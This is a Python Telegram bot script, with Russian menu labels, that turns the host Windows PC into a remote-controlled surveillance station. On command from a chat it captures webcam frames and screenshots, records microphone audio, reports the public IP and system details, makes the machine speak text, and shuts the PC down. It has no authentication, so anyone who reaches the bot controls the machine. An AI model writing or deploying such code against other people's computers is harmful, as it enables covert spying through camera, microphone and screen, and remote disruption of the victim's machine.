import telebot
from config import API_KEY
import cv2
import http.client
import platform
import tempfile
from PIL import ImageGrab
import pyaudio
import wave
import os
import pyttsx3

bot = telebot.TeleBot(API_KEY)


@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("Получить скриншот с веб-камеры")
    markup.add('Получить скриншот экрана ПК')
    markup.add('Получить данные о ПК')
    markup.add('Получить данные с микрофона')
    markup.add('Выключить ПК')
    # markup.add('Получить список запущенных процессов')
    bot.send_message(message.chat.id, 'Добро пожаловать!', reply_markup=markup)
    bot.send_message(message.chat.id, 'Введи /say и напиши что сказать', reply_markup=markup)


@bot.message_handler(regexp='Получить скриншот с веб-камеры')
def echo_message(message):
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        raise IOError("Cannot open webcam")

    ret, frame = cap.read()
    frame = cv2.resize(frame, None, fx=0.5, fy=0.5, interpolation=cv2.INTER_AREA)
    cv2.imwrite("screen.jpg", frame)
    path = 'screen.jpg'
    bot.send_photo(message.chat.id, open(path, 'rb'))

    cap.release()
    cv2.destroyAllWindows()


@bot.message_handler(regexp='Получить данные о ПК')
def echo_message(message):
    conn = http.client.HTTPConnection("ifconfig.me")
    conn.request("GET", "/ip")
    my_system = platform.uname()
    bot.send_message(message.chat.id, f'IP-ADRESS: {conn.getresponse().read().decode("utf-8")}\n'
                                      f'System: {my_system.system}"\n'
                                      f'Node Name: {my_system.node}"\n'
                                      f'"Release: {my_system.release}"\n'
                                      f'"Version: {my_system.version}"\n'
                                      f'"Machine: {my_system.machine}"\n'
                                      f'"Processor: {my_system.processor}"')


@bot.message_handler(regexp='Получить скриншот экрана ПК')
def echo_message(message):
    path = tempfile.gettempdir() + 'screenshot.png'
    screenshot = ImageGrab.grab()
    screenshot.save(path, 'PNG')
    bot.send_photo(message.chat.id, open(path, 'rb'))


@bot.message_handler(regexp='Получить данные с микрофона')
def echo_message(message):
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    RECORD_SECONDS = 15
    WAVE_OUTPUT_FILENAME = "output.wav"
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    input_device_index=1,
                    frames_per_buffer=CHUNK)
    print("Start Recording")
    bot.send_message(message.chat.id, text='Идет запись...')
    frames = []
    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)
    print("Finish!")
    stream.stop_stream()
    stream.close()
    p.terminate()

    wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()

    audio = open(r'C:/Users/Илья/Desktop/Development/PYTHON/TregzMusicBot/output.wav', 'rb')
    bot.send_audio(message.chat.id, audio)
    audio.close()


@bot.message_handler(regexp='Выключить ПК')
def echo_message(message):
    bot.send_message(message.chat.id, 'Выключаю...')
    os.system("shutdown -s -t 0")


@bot.message_handler(commands=['say'])
def echo_message(message):
    msg = bot.send_message(message.from_user.id, 'Напиши что нужно сказать')
    bot.register_next_step_handler(msg, after_text_2)


def after_text_2(message):
    engine = pyttsx3.init()
    text = message.text
    engine.say(text)
    engine.runAndWait()


bot.infinity_polling()
